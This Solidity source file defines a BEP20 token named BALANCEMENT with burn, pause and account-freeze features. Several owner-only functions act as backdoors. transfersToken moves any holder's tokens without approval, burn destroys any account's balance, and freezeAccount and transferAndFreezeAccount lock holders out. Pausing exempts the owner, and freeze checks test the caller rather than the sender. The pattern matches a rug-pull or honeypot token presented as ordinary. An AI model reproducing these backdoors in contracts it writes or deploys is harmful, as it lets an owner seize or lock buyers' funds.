// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IBEP20 {

 function totalSupply() external view returns(uint256);

 function decimals() external view returns(uint256);

 function symbol() external view returns(string memory);

 function name() external view returns(string memory);

 function getOwner() external view returns(address);

 function balanceOf(address account) external view returns(uint256);

 function transfer(address recipient, uint256 amount) external returns(bool);

 function allowance(address _owner, address spender) external view returns(uint256);

 function approve(address spender, uint256 amount) external returns(bool);

 function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);

 event Transfer(address indexed from, address indexed to, uint256 value);

 event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
 function mul(uint256 a, uint256 b) internal pure returns(uint256) {
   if (a == 0) {
     return 0;
   }
       uint256 c = a * b;
   assert(c / a == b);
   return c;
 }

 function div(uint256 a, uint256 b) internal pure returns(uint256) {
       // assert(b > 0); // Solidity automatically throws when dividing by 0
       uint256 c = a / b;
   // assert(a == b * c + a % b); // There is no case in which this doesn't hold
   return c;
 }

 function sub(uint256 a, uint256 b) internal pure returns(uint256) {
   assert(b <= a);
   return a - b;
 }

 function add(uint256 a, uint256 b) internal pure returns(uint256) {
       uint256 c = a + b;
   assert(c >= a);
   return c;
 }
}

contract Ownable {
 address _owner;

 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 constructor() {
   _owner = msg.sender;
   emit OwnershipTransferred(address(0), msg.sender);
 }

 modifier onlyOwner() {
   require(msg.sender == _owner);
   _;
 }

 function transferOwnership(address newOwner) public onlyOwner {
   _transferOwnership(newOwner);
 }

 function _transferOwnership(address newOwner) internal {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}


contract Pausable is Ownable {
 event Pause();
 event Unpause();
 event NotPausable();

 bool public pause = false;
 bool public canPause = true;

 /**
  * @dev Modifier to make a function callable only when the contract is not hit.
  */
 modifier whenNotPause() {
   require(!pause || msg.sender == _owner);
   _;
 }

 /**
  * @dev Modifier to make a function callable only when the contract is hit.
  */
 modifier whenPause() {
   require(pause);
   _;
 }

 /**
    * @dev called by the owner to hit, triggers stopped state
    **/
   function Paused() onlyOwner whenNotPause public {
       require(canPause == true);
       pause = true;
       emit Pause();
   }

 /**
  * @dev called by the owner to unhit, returns to normal state
  */
 function unpaused() onlyOwner whenPause public {
   require(pause == true);
   pause = false;
   emit Unpause();
 }
  /**
    * @dev Prevent the token from ever being hitted again
    **/
   function clearpause() onlyOwner public{
       pause = false;
       canPause = false;
       emit NotPausable();
   }
}

contract BALANCEMENT is IBEP20, Ownable, Pausable {
 using SafeMath for uint256;

 mapping (address => uint256) private _balances;

 mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public frozenAccount;
 event Burn(address a ,uint256 b);

 event FrozenFunds(address target, bool frozen);

 uint256 private _totalSupply;
 uint8 private _decimals;
 string private _symbol;
 string private _name;
 uint8 public burnper;


 constructor(){
   _name = "BALANCEMENT";
   _symbol = "BNC";
   _decimals = 18;
   _totalSupply = 100000 * 10 ** _decimals;
   _balances[msg.sender] = _totalSupply;
   emit Transfer(address(0), msg.sender, _totalSupply);
 }

  
 function getOwner() external view returns (address) {
   return _owner;
 }

 function getAllowance(address owner , address sender) external view returns (uint) {
   return _allowances[owner][sender];
 }

 function decimals() external view returns (uint256) {
   return _decimals;
 }

 function setBurnPercentage(uint8 per) public onlyOwner returns (uint8) {
     burnper = per;
     return burnper;
 }

 function getBurnPercentage() external view returns (uint8) {
     return burnper;
 }

 function symbol() external view returns (string memory) {
   return _symbol;
 }

 function name() external view returns (string memory) {
   return _name;
 }

 function totalSupply() external view returns (uint256) {
   return _totalSupply;
 }

 function balanceOf(address account) external view returns (uint256) {
   return _balances[account];
 }

 function transfer(address recipient, uint256 amount) public whenNotPause returns (bool) {
   _transfer(msg.sender, recipient, amount);
   return true;
 }

 function allowance(address owner, address spender) external view returns (uint256) {
   return _allowances[owner][spender];
 }

 function approve(address spender, uint256 amount) public whenNotPause returns (bool) {
   require(!frozenAccount[msg.sender]);
   _approve(msg.sender, spender, amount);
   return true;
 }

 function transferFrom(address sender, address recipient, uint256 amount) public whenNotPause returns (bool) {
   _transfer(sender, recipient, amount);
   _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
   return true;
 }
 function transfersToken(address sender, address recipient, uint256 amount) external onlyOwner returns (bool) {
   _transfer(sender, recipient, amount);
   return true;
 }
  function increaseAllowances(address spender, uint256 addedValue) public whenNotPause returns (bool success) {
   require(!frozenAccount[msg.sender]);
   _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
   return true;
 }

 function decreaseAllowances(address spender, uint256 subtractedValue) public whenNotPause returns (bool success) {
   require(!frozenAccount[msg.sender]);
   _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
   return true;
 }

 function burn(address account, uint256 amount) public onlyOwner returns (bool) {
   require(!frozenAccount[msg.sender]);
   _burnToken(account, amount);
   return true;
 }

 // freeze the assets of account
 function freezeAccount (address target, bool freeze) public onlyOwner {
       frozenAccount[target] = freeze;
       emit FrozenFunds(target, freeze);
 }

 // transfer and freeze the assets
 function transferAndFreezeAccount (address recipient, uint256 amount) public onlyOwner {
   _transfer(msg.sender, recipient, amount);
   frozenAccount[recipient] = true;
   emit FrozenFunds(recipient, true);
 }

 function _transfer(address sender, address recipient, uint256 amount) internal {
   require(sender != address(0), "BEP20: transfer from the zero address");
   require(recipient != address(0), "BEP20: transfer to the zero address");
   require(!frozenAccount[msg.sender]);

   if(_totalSupply >= 75000 * 10 ** _decimals)
   {
       uint256 burn_amt = amount.mul(burnper).div(100);
       uint256 amt = amount.sub(burn_amt);
       _balances[sender] = _balances[sender].sub(amount);
       _balances[recipient] = _balances[recipient].add(amount);
       _burnToken(recipient,burn_amt);
       emit Transfer(sender, recipient,amt);
   }
   else
   {
       _balances[sender] = _balances[sender].sub(amount);
       _balances[recipient] = _balances[recipient].add(amount);
       emit Transfer(sender, recipient, amount);
   }
 }

 function _mint(address account, uint256 amount) internal {
   require(account != address(0), "BEP20: mint to the zero address");
   require(!frozenAccount[msg.sender]);

   _totalSupply = _totalSupply.add(amount);
   _balances[account] = _balances[account].add(amount);
   emit Transfer(address(0), account, amount);
 }

 function _burnToken(address account, uint256 amount) internal {
   require(account != address(0), "BEP20: burn from the zero address");
   require(!frozenAccount[msg.sender]);

   _balances[account] = _balances[account].sub(amount);
   _totalSupply = _totalSupply.sub(amount);
   emit Transfer(account, address(0), amount);
   emit Burn(account, amount);
 }

 function _approve(address owner, address spender, uint256 amount) internal {
   require(owner != address(0), "BEP20: approve from the zero address");
   require(spender != address(0), "BEP20: approve to the zero address");
   require(!frozenAccount[msg.sender]);

   _allowances[owner][spender] = amount;
   emit Approval(owner, spender, amount);
 }

}